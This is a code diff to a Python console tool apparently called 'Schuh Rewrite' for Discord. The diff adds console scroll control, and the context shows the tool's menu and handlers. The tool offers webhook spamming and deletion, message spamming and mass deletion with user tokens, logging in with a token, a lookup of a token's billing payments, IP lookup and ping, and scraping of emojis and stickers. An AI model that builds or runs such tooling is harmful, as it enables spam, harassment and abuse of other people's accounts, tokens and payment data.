@@ -10,7 +10,43 @@ ENDC = '\033[0m'
 GWL_STYLE = -16
 WS_SIZEBOX = 0x00040000
 WS_MAXIMIZEBOX = 0x00010000
-def set_window_style(hwnd, style):
+STD_OUTPUT_HANDLE = -11
+original_size = None
+original_window = None
+scroll_disabled = False
+class COORD(ctypes.Structure):
+    _fields_ = [("X", ctypes.c_short), ("Y", ctypes.c_short)]
+class SMALL_RECT(ctypes.Structure):
+    _fields_ = [("Left", ctypes.c_short), ("Top", ctypes.c_short), ("Right", ctypes.c_short), ("Bottom", ctypes.c_short)]
+class CONSOLE_SCREEN_BUFFER_INFO(ctypes.Structure):
+    _fields_ = [("dwSize", COORD), ("dwCursorPosition", COORD), ("wAttributes", ctypes.c_ushort), ("srWindow", SMALL_RECT), ("dwMaximumWindowSize", COORD)]
+def scroll_disable():
+    global original_size, original_window, scroll_disabled
+    scroll_disabled = True
+    csbi = CONSOLE_SCREEN_BUFFER_INFO()
+    handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
+    ctypes.windll.kernel32.GetConsoleScreenBufferInfo(handle, ctypes.byref(csbi))
+    original_size = csbi.dwSize
+    original_window = csbi.srWindow
+    new_height = original_window.Bottom - original_window.Top + 1
+    new_size = COORD(csbi.dwSize.X, new_height)
+    ctypes.windll.kernel32.SetConsoleScreenBufferSize(handle, new_size)
+    console_window_size = SMALL_RECT(0, 0, csbi.dwSize.X - 1, new_height - 1)
+    ctypes.windll.kernel32.SetConsoleWindowInfo(handle, True, ctypes.byref(console_window_size))
+def scroll_enable():
+    global original_size, original_window, scroll_disabled
+    scroll_disabled = False
+    handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
+    csbi = CONSOLE_SCREEN_BUFFER_INFO()
+    ctypes.windll.kernel32.GetConsoleScreenBufferInfo(handle, ctypes.byref(csbi))
+    scrollbar_width = csbi.dwSize.X - (original_window.Right - original_window.Left + 1)
+    ctypes.windll.kernel32.SetConsoleScreenBufferSize(handle, original_size)
+    original_window.Right = original_window.Left + original_size.X - 1
+    original_window.Bottom = original_window.Top + original_size.Y - 1
+    if scrollbar_width > 0:
+        original_window.Right -= scrollbar_width
+    ctypes.windll.kernel32.SetConsoleWindowInfo(handle, True, ctypes.byref(original_window))
+def set_window_properties(hwnd, style):
     current_style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_STYLE)
     ctypes.windll.user32.SetWindowLongW(hwnd, GWL_STYLE, current_style & ~style)
 def validate_input(prompt, validator, error_message):
@@ -318,13 +354,17 @@ async def download_stickers_async(stickers, inner_sticker_dir):
     successful_downloads = sum(results)
     return successful_downloads
 system("title " + f"Schuh Rewrite    -    CTRL + C at any time to stop")
-set_window_style(ctypes.windll.kernel32.GetConsoleWindow(), WS_SIZEBOX | WS_MAXIMIZEBOX)
-menu = rf"""
+set_window_properties(ctypes.windll.kernel32.GetConsoleWindow(), WS_SIZEBOX | WS_MAXIMIZEBOX)
+while True:
+    try:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        if scroll_disabled == False: scroll_disable()
+        mode = input(PURPLE + rf"""
                                             _____ ________  ____  ____  __
                                            / ___// ____/ / / / / / / / / /
                                            \__ \/ /   / /_/ / / / / /_/ / 
                                           ___/ / /___/ __  / /_/ / __  /             
-                             │ v0.0.7    /____/\____/_/ /_/\____/_/ /_/    charli <3 │
+                             │ v0.0.8    /____/\____/_/ /_/\____/_/ /_/    charli <3 │
                              ├───────────────────────────┬───────────────────────────┤
                              │ [1] Webhook Spammer       │ [10] Animated Status      │
                              │ [2] Webhook Animator      │ [11] Hypesquad Changer    │
@@ -337,11 +377,7 @@ menu = rf"""
                              │ [9] Message Reacter       │ [18] Scrape Stickers      │
                              ├───────────────────────────┴───────────────────────────┘
                              │
-                             └> """
-while True:
-    try:
-        os.system('cls' if os.name == 'nt' else 'clear')
-        mode = input(PURPLE + menu + ENDC)
+                             └> """ + ENDC)
         try:
             if int(mode) < 0 or int(mode) > 18:
                 continue
@@ -349,6 +385,7 @@ while True:
             pass
         if mode == '1': 
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             message_content = validate_input(PURPLE + "[#] Message you want to spam: " + ENDC, lambda content: len(content) >= 1, "[#] Message too short. Please enter a message with at least 1 character.")            
             webhook_url = validate_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
             delay = validate_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
@@ -358,6 +395,7 @@ while True:
                 time.sleep(delay)
         elif mode == '2':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             message_content = validate_input(PURPLE + "[#] Message you want to spam and animate: " + ENDC, lambda content: len(content) >= 2, "[#] Message too short. Please enter a message with at least 2 characters.")            
             webhook_url = validate_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
             delay = validate_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
@@ -375,6 +413,7 @@ while True:
                         time.sleep(delay)
         elif mode == '3':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             webhook_url = validate_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
             try:
                 response = requests.get(webhook_url)
@@ -395,6 +434,7 @@ while True:
                 pass
         elif mode == '4':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             webhook_url = validate_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
             confirmation = validate_input(PURPLE + "[#] Are you sure you want to delete the webhook? (y/n): " + ENDC, lambda v: v in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n'")
             if confirmation.lower() == 'y':
@@ -404,6 +444,7 @@ while True:
                 input(PURPLE + "[#] Press enter to return." + ENDC)
         elif mode == '5':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             message_content = validate_input(PURPLE + "[#] Message you want to spam: " + ENDC, lambda content: len(content) >= 1, "[#] Message too short. Please enter a message with at least 1 character.")
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             channel_link = validate_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")
@@ -430,6 +471,7 @@ while True:
             continue
         elif mode == '6':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             channel_link = validate_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")
             channel_id_match = re.search(r'/channels/(\d+)/', channel_link)
@@ -477,6 +519,7 @@ while True:
                 pass
         elif mode == '7':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             channel_link = validate_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")
             confirmation = validate_input(PURPLE + "[#] Are you sure you want to delete all messages from the provided token in this channel? (y/n): " + ENDC, lambda v: v in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n'")
@@ -496,6 +539,7 @@ while True:
             continue
         elif mode == '8':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             confirmation = validate_input(PURPLE + "[#] Are you sure you want to close all DMs for the provided token?\n[#] This will not leave group chats.\n[#] (y/n): " + ENDC, lambda v: v in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n'")
             if confirmation.lower() == "y":
@@ -506,6 +550,7 @@ while True:
             continue
         elif mode == '9':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             channel_link = validate_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")
             channel_id_match = re.search(r'/channels/(\d+)/', channel_link)
@@ -531,6 +576,7 @@ while True:
                             last_message_id = message_id
         elif mode == '10':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             status_type_choice = ''
             status_type_choice = validate_input(PURPLE + "[#] 1. Plain Text Statuses\n[#] 2. Emoji & Text Statuses\n[#] Choice: " + ENDC, lambda choice: choice in ['1', '2'], "[#] Invalid Choice, please enter either 1 or 2.")
@@ -570,6 +616,7 @@ while True:
                 time.sleep(delay)
         elif mode == '11':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             hypesquad_options = {'1': 'Bravery', '2': 'Brilliance', '3': 'Balance', '4': 'Remove'}
             for option, house in hypesquad_options.items():
@@ -595,6 +642,7 @@ while True:
             input(PURPLE + "[#] Press enter to return." + ENDC)
         elif mode == '12':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             ip_address = validate_input(PURPLE + "[#] IP Address: " + ENDC, validate_ip, "[#] Invalid IP Address. Please check the IP and try again.")
             ip_data = ip_lookup(ip_address)
             if ip_data is not None:
@@ -612,6 +660,7 @@ while True:
             continue
         elif mode == '13':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             ip_address = validate_input(PURPLE + "[#] IP Address: " + ENDC, validate_ip, "[#] Invalid IP Address. Please check the IP and try again.")
             ping_count = validate_input(PURPLE + "[#] Number of times to ping: " + ENDC, lambda x: x.isdigit() and int(x) > 0, "[#] Invalid Input. Please enter a positive integer.")
             ping_ip(ip_address, int(ping_count))
@@ -619,6 +668,7 @@ while True:
             continue
         elif mode == '14':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             user_info = get_user_info(user_token)
             num_guilds = get_num_user_guilds(user_token)
@@ -677,6 +727,7 @@ while True:
             continue
         elif mode == '15':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             headers = {'authorization': user_token, 'Content-Type': 'application/json'}
             response = requests.get('https://discord.com/api/v9/users/@me/billing/payments', headers=headers)
@@ -709,6 +760,7 @@ while True:
             continue
         elif mode == '16':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = input(PURPLE + "[#] Token: " + ENDC)
             headers = {'authorization': user_token}
             print(PURPLE + "[#] Logging in with Token.." + ENDC)
@@ -725,6 +777,7 @@ while True:
             continue
         elif mode == '17':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             server_id = validate_input(PURPLE + "[#] Server ID: " + ENDC, lambda id: id.isdigit() and 18 <= len(id) <= 21, "[#] Invalid Server ID. Please check the ID and try again.")
             inner_emoji_dir = os.path.join("emojis", str(server_id))
@@ -744,6 +797,7 @@ while True:
             continue
         elif mode == '18':
             os.system('cls' if os.name == 'nt' else 'clear')
+            if scroll_disabled == True: scroll_enable()
             user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
             server_id = validate_input(PURPLE + "[#] Server ID: " + ENDC, lambda id: id.isdigit() and 18 <= len(id) <= 21, "[#] Invalid Server ID. Please check the ID and try again.")
             inner_sticker_dir = os.path.join("stickers", str(server_id))
